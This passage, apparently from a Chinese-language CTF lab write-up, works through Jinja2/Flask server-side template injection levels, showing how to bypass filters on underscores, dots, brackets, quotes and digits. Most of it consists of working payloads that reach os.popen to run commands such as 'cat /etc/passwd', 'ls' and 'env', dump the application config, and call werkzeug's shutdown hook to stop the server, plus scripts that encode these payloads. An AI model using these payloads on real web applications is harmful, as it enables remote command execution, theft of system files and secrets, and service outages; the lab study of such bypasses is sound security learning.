class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(evalclass_r)<br>        <br>  <span class="hljs-comment">#找到chr在第64个子类里</span><br></code></pre></td></tr></table></figure>

<p><code>&#123;&#123;chr(65)&#125;&#125;</code>将渲染为‘A’，如下图</p>
<p><img src="/2023/02/09/ssti/image-20230801030534571.png"></p>
<p>%2b(‘+’)用于连接两个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(111)%2bchr(115)).popen(chr(108)%2bchr(115)).read()&#125;&#125;<br>#等价于<br>&#123;%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>#这里一定注意import两端的下划线呜呜呜呜，忘记了这个模块有下划线，然后又是全都是ascii码好久都没发现<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230801034608529.png"></p>
<p>这样挨个对ascii码太麻烦了，写个python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;cat /etc/passwd&quot;</span><br><span class="hljs-keyword">for</span> index,char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">str</span>):<br>    joinchr = <span class="hljs-string">&#x27;%2b&#x27;</span> <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;chr(&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(char)),end=joinchr)<br>    <br><span class="hljs-comment">#output:chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)</span><br><br></code></pre></td></tr></table></figure>

<p>写脚本的时候再学点python新知识,<code>enumerate()</code>函数，用于将一个可迭代对象(列表、元组、字符串等)转化为枚举对象，枚举对象可提供迭代对象的元素及其索引，有点像<code>foreach as</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">fruits = [<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>]<br><span class="hljs-keyword">for</span> index, fruit <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fruits):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Index <span class="hljs-subst">&#123;index&#125;</span>: <span class="hljs-subst">&#123;fruit&#125;</span>&quot;</span>)<br>    <br><span class="hljs-comment">#output:Index 0: apple</span><br><span class="hljs-comment">#Index 1: banana</span><br><span class="hljs-comment">#Index 2: orange</span><br></code></pre></td></tr></table></figure>

<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>下划线被过滤了，受上一题的启发，试试request，诶嘿，可行，这里不要用点来取值，用中括号，用点的话逻辑关系全乱了</p>
<p><img src="/2023/02/09/ssti/image-20230801042557864.png"></p>
<p>好玩</p>
<p><img src="/2023/02/09/ssti/image-20230801042414133.png"></p>
<p>去网上看了看，还有别的绕过姿势，编码绕过</p>
<p>十六进制编码绕过：</p>
<p>对’_’hex编码，是5f，写作转义序列，\x5f</p>
<p><img src="/2023/02/09/ssti/image-20230801171743303.png"></p>
<p>一个一个下划线转太麻烦，这里用python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">string = <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(64).__init__.__globals__.__builtins__&#125;&#125;&quot;</span><br><br>string = string.replace(<span class="hljs-string">&#x27;_&#x27;</span>,(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;_&#x27;</span>))))<br>string = string.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(string)<br><br><br><span class="hljs-comment">#output：&#123;&#123;&#x27;&#x27;.\x5f\x5fclass\x5f\x5f.\x5f\x5fbase\x5f\x5f.\x5f\x5fsubclasses\x5f\x5f().\x5f\x5fgetitem\x5f\x5f(64).\x5f\x5finit\x5f\x5f.\x5f\x5fglobals\x5f\x5f.\x5f\x5fbuiltins\x5f\x5f&#125;&#125;</span><br><span class="hljs-comment">#再手动把点换为[]，包裹住记的字符串得加引号，只用把名字括起来就行了，函数的小括号在中括号外：&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[&quot;\x5f\x5fgetitem\x5f\x5f&quot;](64)[&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;]&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230801174345081.png"></p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[&quot;\x5f\x5fgetitem\x5f\x5f&quot;](64)[&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230801174537355.png"></p>
<p>ascii编码绕过：</p>
<p>python中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;num:state&#125;<br><span class="hljs-comment">#num表示格式化字符在参数列表中的索引，不填默认递增</span><br><span class="hljs-comment">#state表示格式说明符</span><br><span class="hljs-comment">#%s：字符串格式化。将变量作为字符串显示。</span><br><span class="hljs-comment">#%d：整数格式化。将变量作为十进制整数显示。</span><br><span class="hljs-comment">#%f：浮点数格式化。将变量作为浮点数显示。</span><br><span class="hljs-comment">#%x：十六进制格式化。将整数变量显示为小写十六进制数。</span><br><span class="hljs-comment">#%X：十六进制格式化。将整数变量显示为大写十六进制数。</span><br><span class="hljs-comment">#%o：八进制格式化。将整数变量显示为八进制数。</span><br><span class="hljs-comment">#%c：字符格式化。将整数变量显示为对应的 Unicode 字符。</span><br><span class="hljs-comment">#%r：原始数据格式化。使用 repr() 函数将变量转换为字符串显示。</span><br><br><span class="hljs-comment">#这里我们要利用的就是%c</span><br><br><span class="hljs-string">&quot;&#123;:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">65</span>)==<span class="hljs-string">&#x27;A&#x27;</span><br><span class="hljs-comment">#因此</span><br><br><span class="hljs-string">&quot;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">99</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>)=<span class="hljs-string">&#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230801180249226.png"></p>
<p><code>format()</code>过滤器：(适用于中括号和点都被过滤)</p>
<p><img src="/2023/02/09/ssti/image-20230802003013611.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95)==&#x27;__class__&#x27;<br></code></pre></td></tr></table></figure>

<p><code>attr()</code>过滤器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;|attr(&quot;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95))|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(64)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fimport\x5f\x5f&quot;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;<br><br>#取元素时一定要getitem，attr()过滤器用就要一用到底，不能与[],&#x27;.&#x27;等混用，也可unicode编码(\u005f)<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230801222353241.png"></p>
<p>对于python2<code>attr()</code>内也可base64编码，但是我的题目环境是py3，所以无法实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)<br></code></pre></td></tr></table></figure>

<p>多种方式可以组合来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;|attr(request.form.a)|attr(request.form.b)|attr(request.form.c)()|attr(request.form.d)(64)|attr(request.form.e)|attr(request.form.f)|attr(request.form.d)(request.form.g)|attr(request.form.d)(request.form.h)(request.form.i)&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__builtins__&amp;h=eval&amp;i=__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230801224316737.png"></p>
<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>点被过滤，前面讲过了，用中括号绕过。几种方式组合一下</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[64][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](request[&#x27;form&#x27;][&#x27;cmd&#x27;])[&#x27;read&#x27;]()&#125;&#125;&amp;cmd=cat /etc/passwd<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230801235148461.png"></p>
<p>或者attr()过滤器，或者request对象绕过等等就不多说了</p>
<p><img src="/2023/02/09/ssti/image-20230801235916098.png"></p>
<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>字符串拼接绕过：</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__clas&#x27;&#x27;s__&#x27;][&#x27;__bas&#x27;&#x27;e__&#x27;][&#x27;__subclas&#x27;&#x27;ses__&#x27;]()[64][&#x27;__ini&#x27;&#x27;t__&#x27;][&#x27;__globa&#x27;&#x27;ls__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;pop&#x27;&#x27;en&#x27;](&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230802000940569.png"></p>
<p>拼接字符串也可以参考<code>join()</code>过滤器</p>
<p><img src="/2023/02/09/ssti/image-20230802002124378.png"></p>
<p><img src="/2023/02/09/ssti/image-20230802002143318.png"></p>
<p>中括号被ban用<code>dict()</code>函数创建字典：<code>dict(__clas=1,s__=2)|join()</code></p>
<p>jinja2中还支持’~’字符连接两个变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230802003435533.png"></p>
<p>或者字符串切片反转字符串：</p>
<p><img src="/2023/02/09/ssti/image-20230802001152213.png"></p>
<p>反转字符串还可以使用<code>reverse()</code>过滤器绕实现</p>
<p><img src="/2023/02/09/ssti/image-20230802002515106.png"></p>
<p><code>replace()</code>过滤器：</p>
<p><img src="/2023/02/09/ssti/image-20230802002356262.png"></p>
<p><img src="/2023/02/09/ssti/image-20230802002419304.png"></p>
<p><code>string()</code>过滤器：将渲染在浏览器的部分转为一个字符串输出；</p>
<p><code>select()</code>过滤器：<img src="/2023/02/09/ssti/image-20230802005306318.png"></p>
<p>但是不知道为什么，放到浏览器后会是这样的：</p>
<p><img src="/2023/02/09/ssti/image-20230802005341317.png"></p>
<p>但是结合上那个<code>string()</code>过滤器，有点东西</p>
<p>能通过下标获取字符，</p>
<p><img src="/2023/02/09/ssti/image-20230802005523502.png"></p>
<p>可以再简单点<img src="/2023/02/09/ssti/image-20230802005559881.png"></p>
<p>拼个<code>__class__</code>看看，字符之间用~连接</p>
<p><img src="/2023/02/09/ssti/image-20230802010231838.png"></p>
<p>假如说中括号被过滤了呢？怎么取下标，不慌，这里还有一个过滤器<code>list()</code>，能把字符串对象转化成列表对象输出：</p>
<p><img src="/2023/02/09/ssti/image-20230802011023942.png"></p>
<p>这样一来就能用<code>pop()</code>方法输出字典内容了，当然用不用<code>list()</code>过滤器都能用<code>__getitem__</code><img src="/2023/02/09/ssti/image-20230802011047462.png"></p>
<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>数字被过滤了？</p>
<p>不慌，有两个过滤器：</p>
<p><code>length()</code>过滤器：</p>
<p><img src="/2023/02/09/ssti/image-20230802013135950.png"></p>
<p><code>count()</code>过滤器：</p>
<p><img src="/2023/02/09/ssti/image-20230802013210012.png"></p>
<p><code>index()</code>函数获取数字</p>
<p><img src="/2023/02/09/ssti/image-20230802193034146.png"></p>
<p><img src="/2023/02/09/ssti/image-20230802193133736.png"></p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;|count()][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.form.cmd).read()&#125;&#125;&amp;cmd=cat /etc/passwd<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230802013559353.png"></p>
<p>搞定，学习别人的方法，可以直接通过循环寻找可利用类，不需要数字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>

<p>实际情况中可以自行选择可利用类，万一popen就被ban了呢？</p>
<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>把config关掉了</p>
<p><img src="/2023/02/09/ssti/image-20230802015231902.png"></p>
<p>学习怎么查看配置的时候发现了一个好玩的：</p>
<p>在request对象中有一个叫做environ的对象，request.environ字典包含和服务器环境相关的对象，其中有一个’werkzeug.server.shutdown’&#x3D;&gt;shutdown_server()的方法，所以当我们注入<code>code=&#123;&#123;request.environ['werkzeug.server.shutdown']()&#125;&#125;</code>时</p>
<p><img src="/2023/02/09/ssti/image-20230802020434847.png"></p>
<p>叮咚，程序停了</p>
<p><img src="/2023/02/09/ssti/image-20230802020620149.png"></p>
<p>还发现某些情况下也可以不用那么麻烦地向前回溯到基类，再往下找可利用类和方法，一些内置的对象和函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;get_flashed_messages.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;url_for.__globals__.__builtins__.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>学会了不用<code>__globals__</code>的注入姿势：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">#warnings.catch_warnings类内部定义了_module=sys.modules[&#x27;warnings&#x27;]，而warnings模块含有__builtins__，如果可以找到warnings.catch_warnings类,则可以不使用__globals__<br><br>code=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[157]()._module.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230802032116868.png"></p>
<p>还发现了过滤了class的话可以用dict直接跳过获取对象类的步骤：</p>
<p><img src="/2023/02/09/ssti/image-20230802023425961.png"></p>
<p>最后总算找到了<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8029">一篇文章</a>，对于ssti的讲解还是比较到位的</p>
<p>如果过滤了config，又需要查config：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230802030842185.png"></p>
<p>自己试了别的，发现url_for也可以，flask内置了这两个函数，</p>
<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p><img src="/2023/02/09/ssti/image-20230802152241886.png"></p>
<p>过滤了挺多东西的，点和中括号都被过滤了就得考虑<code>attr()</code>过滤器了，引号和request也被过滤了，那就拼字符，点被过滤所以chr的路暂时行不通(其实也不是不行就是很麻烦)，上面讲到过<code>select()</code>和<code>string()</code>还有<code>list()</code>过滤器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;1|select|string|list&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230802135939015.png"></p>
<p>考虑到attr()过滤器里面包含的是字符串，那就先拼个pop出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set pop=dict(pop=a)|join()%&#125;&#123;&#123;(1|select|string|list)|attr(pop)(0)&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>都做到这了，有了新的想法，为啥那么麻烦一个一个字符地拼接呢，直接字符串拼起来不就好了</p>
<p>没过滤下划线，那就把下划线设为一个变量，到时候变量与变量用~连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;&#123;&#123;under&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>再拼接关键词：</p>
<p>这里为了减少工作量，我们选择payload原型为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>需要的引号内的关键字有<code>__globals__</code>,<code>__import__</code>,<code>__builtins__</code>,os,popen,read,cmd，当然选中<code>__builtins__</code>属性的话还需要<code>__getitem__</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set cmd=dict(cmd=a)|join()%&#125;<br></code></pre></td></tr></table></figure>

<p>先测试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set cmd=dict(ls=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(getitem)(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到已经成功导入os模块了！</p>
<p><img src="/2023/02/09/ssti/image-20230802142259287.png"></p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set cmd=dict(env=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230802145108337.png"></p>
<p>emmm，停，有点问题，空格咋办，执行命令时难免会碰到空格的吧，当我试着用上面类似的方法构造空格时我失败了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set space=dict( =a)|join()%&#125;#这种方法不行<br></code></pre></td></tr></table></figure>

<p>还是得回到上面select过滤器那里，构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set pop=dict(pop=a)|join()%&#125;&#123;%set space=(1|select|string|list)|attr(pop)(10)%&#125;<br></code></pre></td></tr></table></figure>

<p>这样就能构造空格啦</p>
<p>然后就成这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set pop=dict(pop=a)|join()%&#125;<br>&#123;%set space=(1|select|string|list)|attr(pop)(10)%&#125;<br>&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set cmd=dict(la=a)|join()~space~dict(/=b)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>啊啊啊啊啊啊还要再pop斜杠，好麻烦。。</p>
<p>浪费那么多时间不如试试request拼接</p>
